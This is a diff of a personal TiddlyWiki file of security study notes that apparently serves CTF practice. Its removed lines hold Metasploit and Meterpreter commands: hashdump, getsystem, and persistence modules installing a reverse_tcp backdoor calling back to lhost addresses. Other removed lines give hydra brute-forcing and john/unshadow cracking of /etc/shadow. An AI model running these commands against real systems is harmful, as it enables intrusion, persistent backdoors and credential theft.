@@ -265,8 +265,6 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 
 <li>Docker</li>
 
-<li>Draft of 'Exploitation'</li>
-
 <li>Draft of 'LinEnum'</li>
 
 <li>Entertainment</li>
@@ -9650,7 +9648,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20210810022253593" modified="20210825230930363" title="$:/state/toc/TableOfContents/Tech-Game Development--118161433">
 <pre>close</pre>
 </div>
-<div created="20210927144305639" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Draft of 'Exploitation']] [[Password Cracking]]" modified="20210927151905421" title="$:/StoryList">
+<div created="20210927144305639" list="CrappyMakerProgrammer Tech [[Cyber Security]] [[Privilege Escalation]]" modified="20210927152452598" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -10402,10 +10400,13 @@ $ sed -i 's/\(.\)\{16\}$//g' binary.txt
 ```
 </pre>
 </div>
-<div created="20191219104819416" modified="20210927151817511" tags="Tech" title="Cyber Security">
+<div created="20191219104819416" modified="20210927152247356" tags="Tech" title="Cyber Security">
 <pre>A good &amp; easy way to get started in Cyber Security is to just participate in Capture the Flag Competitions, ans google for writeups, understanding &amp; solutions along the way
 
 ! Penetration Testing Framework
+
+[[Penetration Testing Framework]]
+
 # [[Scanning]]
 # Enumeration: [[Network Services]]
 # [[Exploitation]]
@@ -10529,85 +10530,6 @@ https://github.com/Hackin7/ReStation/tree/master/LockerHubCode
 Put `docker-compose.yaml` in current directory, then run `docker-compose up`
 </pre>
 </div>
-<div created="20210904163141554" draft.of="Exploitation" draft.title="Exploitation" modified="20210927151904002" title="Draft of 'Exploitation'">
-<pre>! Other ways of Exploitation
-
-# [[Web Hacking]]
-# [[Password Cracking]]
-
-
-!! Windows Passwords
-
-You can download and run ophcrack
-
-! Metasploit
-
-Google all services and Find related Issues
-Metasploit msfconsole
-
-```
-search &lt;keyword&gt;
-use &lt;module&gt;
-show options
-set VAR &lt;value&gt;
-exploit
-```
-
-!! Meterpreter
-
-```
- background
- session -l # Lists your open sessions
- sessions -i 3 # Interact with/ open/ enter session 3
- getsystem # PrivEsc for Windows
- sysinfo, ifconfig, route, getuid # Internal Enumeration
- search -f file.txt
- download thisFile.txt /in/my/directory/here # Also has upload
- hashdump # Dumps Windows SAM password hashes  
- shell
-```
-
-If cannot bypass UAC for PrivEsc, use `exploit/windows/local/bypassuac` module, which only needs the meterpreter session
-VPN have to be connectged in VM to use VM's metasploit to exploit
-
-!!! Persistence
-
-Windows Vista and Above
-
-```
-# persistent backdoor - need meterpreter session
-msf &gt; use exploit/windows/local/s4u_persistence
-msf (s4u_persistence) &gt; set session 2
-#session =&gt; 2
-msf (s4u_persistence) &gt; set trigger logon
-#trigger =&gt; logon
-msf (s4u_persistence) &gt; set payload windows/meterpreter/reverse_tcp
-msf (s4u_persistence) &gt; set lhost 1.2.3.4
-msf (s4u_persistence) &gt; set lport 1234
-msf (s4u_persistence) &gt; exploit
-```
-
-Others
-
-```
-use exploit/windows/local/persistence
-set reg_name backdoor
-set exe_name backdoor
-set startup SYSTEM
-set session 1
-set payload windows/meterpreter/reverse_tcp
-set exitfunc process
-set lhost 192.168.99.100
-set lport 5555
-set DisablePayloadHandler false
-exploit //if the backdoor doesn't start immediately, use &quot;exploit -j&quot; instead
-Connecting to backdoor
-msf (s4u_persistence) &gt; use exploit/multi/handler
-msf (handler) &gt; set payload windows/meterpreter/reverse_tcp
-msf (handler) &gt; exploit
-# once victim restarts and logons, we will get a meterpreter shell
-```</pre>
-</div>
 <div modified="20210913120411045" title="Draft of 'LinEnum'">
 <pre></pre>
 </div>
@@ -10629,29 +10551,12 @@ Check my [[Youtube Channel|https://www.youtube.com/channel/UChDzBIt2yj4aGUKpPnjj
 
 Check my other youtube channel, the one with the Kimetsu no Yaiba OP Electone Cover</pre>
 </div>
-<div created="20210904163141554" modified="20210904163819980" title="Exploitation">
+<div created="20210904163141554" modified="20210927152227382" title="Exploitation">
 <pre>! Other ways of Exploitation
 
 # [[Web Hacking]]
+# [[Password Cracking]]
 
-
-! Password Cracking
-
-```
-hydra -L &lt;users&gt; -P &lt;passwords.txt&gt; &lt;ip&gt; &lt;service eg. ssh&gt;
-eg. hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt
-```
-
-Example services: `ssh`, `mssql`
-
-!! Linux Passwords
-Get password file from `/etc/passwd`, shadow file from `/etc/shadow`
-
-```
-unshadow &lt;password_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
-john &lt;password_hash/hash_list&gt;
-john -wordlist /path/to/wordlist -users=users.txt hashfile
-```
 
 !! Windows Passwords
 
@@ -11352,7 +11257,7 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ### Change (not add, It will pick the first proxy server) the last line to `socks4 127.0.0.1 1080`
 ## `proxychains4 &lt;command&gt;`</pre>
 </div>
-<div created="20210904164116778" modified="20210913120939841" title="Privilege Escalation">
+<div created="20210904164116778" modified="20210927160732665" title="Privilege Escalation">
 <pre>! Linux
 
 (To Improve)
@@ -11373,7 +11278,13 @@ Referenced from [[here|https://infinitelogins.com/2021/02/20/using-metasploit-ro
 ## eg. Python Library Injection
 ## C Library Injection
 
-! Windows</pre>
+! Windows
+
+# Registry Escalation
+# Service Escalation
+# Potato Escalation
+# Password Mining Escalation
+# Kernal Exploit</pre>
 </div>
 <div created="20191105065551127" modified="20210828135851585" tags="Tech" title="Programming">
 <pre>! Programming Languages
